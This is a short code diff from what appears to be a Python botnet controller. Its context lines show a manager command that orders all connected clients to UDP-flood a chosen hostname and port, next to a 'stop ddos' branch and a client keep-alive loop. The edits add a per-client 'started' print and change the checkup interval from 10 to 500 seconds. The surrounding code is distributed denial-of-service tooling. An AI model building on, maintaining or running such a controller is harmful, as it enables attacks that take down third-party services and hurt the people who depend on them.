@@ -68,6 +68,7 @@ def handle_manager(conn, addr, server):
                     print(f'[NOTICE] UDP flooding {hostname} on port {port}')
                     for i, client in enumerate(client_objects):
                         client.start_ping(hostname, port)
+                        print(f'Client {i+1} started')
                     
                     conn.send(f'[NOTICE] UDP flooding {hostname} on port {port}'.encode('utf-8'))
                 #stop ddos
@@ -115,7 +116,8 @@ def handle_client(conn, addr, server):
             #print(f'Client {index + 1}')
             #check if the client is still connected
             client.checkup()
-            time.sleep(10)
+            #change this value to change checkup frequency
+            time.sleep(500)
     except:
             print(f'\n[NOTICE] Connection with {addr[0]} closed')
             current_clients.remove(client)
